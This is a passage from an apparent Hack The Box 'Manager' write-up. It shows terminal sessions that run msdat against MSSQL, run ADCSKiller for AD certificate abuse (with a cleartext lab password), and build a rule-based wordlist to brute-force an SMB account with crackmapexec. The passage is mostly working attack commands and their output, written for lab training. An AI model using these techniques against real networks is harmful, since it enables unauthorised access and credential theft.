┌──(bravosec㉿fsociety)-[~/htb/Manager]
└─$ /opt/sectools/exploitation/msdat/msdat.py all -s manager.htb -U 'manager.htb\Operator' -P 'operator'

[1] (10.129.52.126:1433): Testing the 'master' database with the account manager.htb\Operator/operator
[1.1] Can the current user become sysadmin with trustworthy database method ?
[-] KO
[1.2] You can steal hashed passwords ?
[+] OK
[1.3] Can we execute system commands with xpcmdshell (directly) ?
[-] KO
[1.4] Can we re-enable xpcmdshell to use xpcmdshell ?
[-] KO
[1.5] Can you use SQL Server Agent Stored Procedures (jobs) to execute system commands?
[-] KO
[-] KO
[1.6] Can you capture a SMB authentication ?
[+] ? (perhaps)
[1.7] Can you use OLE Automation to read files ?
[-] KO
[1.8] Can you use OLE Automation to write files ?
[-] KO
[1.9] Can you use OLE Automation to execute Windows system commands ?
[-] KO
[1.10] Can you use Bulk Insert to read files ?
[-] KO
[1.11] Can you use Openrowset to read files ?
[-] KO
[1.12] Can you connect to remote databases with openrowset ? (useful for dictionary attacks)
[-] KO
[1.13] Can you list files with xp_dirtree ?
[+] OK
[1.14] Can you list directories with xp_subdirs ?
[-] KO
[1.15] Can you list drives with xp_subdirs ?
[+] OK
[1.16] Can you list medias with xp_availablemedia ?
[-] KO
[1.17] Can you check if a file exist thanks to xp_fileexist ?
[+] OK
[1.18] Can you create a folder with xp_createsubdir ?
[-] KO


[2] (10.129.52.126:1433): MSSQL users have not the password identical to the username ?
The login sa has already been tested at least once. What do you want to do:                                                                                                                     | ETA:  00:00:13
- stop (s/S)
- continue and ask every time (a/A)
- continue without to ask (c/C)
s
100% |##########################################################################################################################################################################################| Time: 00:02:00
[-] No found a valid account on 10.129.52.126:1433 in UsernameLikePassword module
```


## ADCSKiller - ADCS Exploitation Automation Tool

> https://github.com/grimlockx/ADCSKiller

Since there were no vulnerable templates, it didn't work

```bash
┌──(bravosec㉿fsociety)-[/opt/sectools/ad/ADCSKiller]
└─$ python adcskiller.py -d 'manager.htb' -u 'raven' -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.52.126 -L 10.10.16.24


        ▄▄▄      ▓█████▄  ▄████▄    ██████  ██ ▄█▀ ██▓ ██▓     ██▓    ▓█████  ██▀███
        ▒████▄    ▒██▀ ██▌▒██▀ ▀█  ▒██    ▒  ██▄█▒ ▓██▒▓██▒    ▓██▒    ▓█   ▀ ▓██ ▒ ██▒
        ▒██  ▀█▄  ░██   █▌▒▓█    ▄ ░ ▓██▄   ▓███▄░ ▒██▒▒██░    ▒██░    ▒███   ▓██ ░▄█ ▒
        ░██▄▄▄▄██ ░▓█▄   ▌▒▓▓▄ ▄██▒  ▒   ██▒▓██ █▄ ░██░▒██░    ▒██░    ▒▓█  ▄ ▒██▀▀█▄
        ▓█   ▓██▒░▒████▓ ▒ ▓███▀ ░▒██████▒▒▒██▒ █▄░██░░██████▒░██████▒░▒████▒░██▓ ▒██▒
        ▒▒   ▓▒█░ ▒▒▓  ▒ ░ ░▒ ▒  ░▒ ▒▓▒ ▒ ░▒ ▒▒ ▓▒░▓  ░ ▒░▓  ░░ ▒░▓  ░░░ ▒░ ░░ ▒▓ ░▒▓░
        ▒   ▒▒ ░ ░ ▒  ▒   ░  ▒   ░ ░▒  ░ ░░ ░▒ ▒░ ▒ ░░ ░ ▒  ░░ ░ ▒  ░ ░ ░  ░  ░▒ ░ ▒░
        ░   ▒    ░ ░  ░ ░        ░  ░  ░  ░ ░░ ░  ▒ ░  ░ ░     ░ ░      ░     ░░   ░
            ░  ░   ░    ░ ░            ░  ░  ░    ░      ░  ░    ░  ░   ░  ░   ░
                ░      ░



ADCSKiller v0.3 - by Maurice Fielenbach (grimlockx) - Hexastrike Cybersecurity UG (haftungsbeschränkt)

[*] Trying to find vulnerable certificate templates
[+] Saved certipy output to 20231024013702_Certipy.json

[*] Trying to bind to ldap://10.129.52.126:389
[+] Bind to ldap://10.129.52.126:389 successful

[*] Getting Domain SID
[+] Received Domain SID: S-1-5-21-4078382237-1492182817-2568127209
[*] Getting Domain Administrators Group Common Name of manager.htb using objectSID: S-1-5-21-4078382237-1492182817-2568127209-512
[*] Getting Domain Administrators of manager.htb using Common Name: Domain Admins
[+] Found Domain Administrators: Administrator

[*] Getting Domaincontrollers
[+] Found domain controllers: DC01.manager.htb

[+] Parsing certipy output 20231024013702_Certipy.json
[+] Found vulnerabilities: ['ESC7']

Traceback (most recent call last):
  File "/opt/sectools/ad/ADCSKiller/adcskiller.py", line 377, in <module>
    exploit.fetch_certipy_results()
  File "/opt/sectools/ad/ADCSKiller/adcskiller.py", line 249, in fetch_certipy_results
    for template in templates.values():
                    ^^^^^^^^^^^^^^^^
AttributeError: 'str' object has no attribute 'values'
```


## Targeted brute force on user Operator

The user `Operator` seems interesting

Make a password list based on its name

```bash
┌──(bravosec㉿fsociety)-[~/htb/Manager]
└─$ echo 'Operator' > tmp

┌──(bravosec㉿fsociety)-[~/htb/Manager]
└─$ hashcat --force --stdout tmp -r /usr/share/hashcat/rules/best64.rule > wordlist_operator_b64.txt
```

I will try both wordlists : `cewl_b64.txt`, `wordlist_operator_b64.txt`

```bash
cme smb manager.htb -u 'Operator' -p cewl_b64.txt
cme smb manager.htb -u 'Operator' -p wordlist_operator_b64.txt
```

Password was in `wordlist_operator_b64.txt`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Manager]
└─$ cme smb manager.htb -u 'Operator' -p wordlist_operator_b64.txt
SMB         10.129.52.126   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.129.52.126   445    DC01             [-] manager.htb\Operator:Operator STATUS_LOGON_FAILURE
SMB         10.129.52.126   445    DC01             [-] manager.htb\Operator:rotarepO STATUS_LOGON_FAILURE
SMB         10.129.52.126   445    DC01             [-] manager.htb\Operator:OPERATOR STATUS_LOGON_FAILURE
SMB         10.129.52.126   445    DC01             [+] manager.htb\Operator:operator
```